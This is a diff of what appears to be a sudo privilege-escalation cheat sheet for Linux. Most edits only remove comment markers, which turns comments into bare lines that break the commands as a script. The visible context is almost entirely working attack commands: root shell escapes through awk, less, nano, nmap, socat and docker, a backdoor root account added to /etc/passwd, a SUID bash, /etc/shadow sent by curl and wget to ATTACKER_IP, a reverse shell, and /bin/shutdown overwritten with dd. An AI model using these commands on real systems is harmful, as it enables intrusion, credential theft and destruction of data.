@@ -128,15 +128,15 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 
 4. less / more
 sudo less /etc/passwd
-# Then type: !sh
+Then type: !sh
 
 5. man
 sudo man man
-# Then type: !sh
+Then type: !sh
 
 6. nano
 sudo nano
-# Ctrl+R → Ctrl+X → enter: /bin/sh
+Ctrl+R → Ctrl+X → enter: /bin/sh
 
 7. nmap
 echo "os.execute('/bin/sh')" > /tmp/script.nse
@@ -148,12 +148,12 @@ sudo cp /etc/passwd /tmp/passwd.bak
 echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
 
 9. chmod
-# Make a SUID binary world-executable
+ Make a SUID binary world-executable
 sudo chmod +s /usr/bin/bash
 /usr/bin/bash -p
 
 10. chown
-# Take ownership of sensitive file
+ Take ownership of sensitive file
 sudo chown $USER:/etc/shadow
 cat /etc/shadow
 
@@ -177,7 +177,7 @@ sudo ruby -e 'exec "/bin/sh"'
 sudo awk '//' /etc/shadow
 
 16. curl / wget
-# Upload data
+Upload data
 sudo curl http://ATTACKER_IP --data @/etc/shadow
 sudo wget --post-file=/etc/shadow http://ATTACKER_IP:4444
 
@@ -188,12 +188,12 @@ sudo docker run -v /:/host -it alpine chroot /host /bin/sh
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
-ExecStart=/bin/sh -c "id > /tmp/out"
+ExecStart=/bin/sh -c "COMMAND_HERE > OUTPUT_PATH"
 [Install]
 WantedBy=multi-user.target' > $TF
 sudo systemctl link $TF
 sudo systemctl enable --now $TF
-cat /tmp/out
+cat OUTPUT_PATH
 
 19. socat
 sudo socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
@@ -208,7 +208,7 @@ sudo env /bin/sh
 sudo ltrace -o /dev/null /bin/sh
 
 23. dd
-# Write reverse shell to MBR or overwrite file
+ Write reverse shell to MBR or overwrite file
 echo -e '#!/bin/sh\ncat /etc/shadow' > /tmp/shell.sh
 sudo dd if=/tmp/shell.sh of=/bin/shutdown
 
